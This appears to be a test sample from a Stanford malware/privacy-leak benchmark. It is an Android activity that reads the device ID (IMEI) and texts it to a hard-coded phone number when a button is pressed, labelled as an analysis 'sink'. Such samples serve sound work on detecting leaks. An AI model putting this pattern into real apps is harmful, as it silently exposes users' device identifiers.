package stamp.stanford.malware;

import java.io.IOException;
import java.net.MalformedURLException;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends Activity {

	Button SMSbtn;
	String phoneNum = "7573456789";


	//Explicit intent to carry sensitive data.
	Intent sentIntent;
	Intent deliverIntent;

	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		SMSbtn = (Button) findViewById(R.id.SMSbtn);

		SMSbtn.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View view) {
				// TODO Auto-generated method stub
				String msg = "STAMP";
				TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
				String deviceId = tm.getDeviceId();
				sendMsg(deviceId, msg);
			}
		});
		
	}
	
	private void sendMsg(String deviceId, String msg) {

		//Pending intent to receive asynchronous event.
		Intent sentIntent = new Intent(this, SmsBroadcastReceiver.class);
		sentIntent.putExtra("deviceId", deviceId);

		PendingIntent pSentIntent = PendingIntent.getBroadcast(
				MainActivity.this, 0, sentIntent, 0);

		/* Sink 1: Send SMS */
		if (phoneNum.length() > 0 && msg.length() > 0) {
			SmsManager smsMgr = SmsManager.getDefault();
			smsMgr.sendTextMessage(phoneNum, null, deviceId, pSentIntent, null);
		}

	}

}
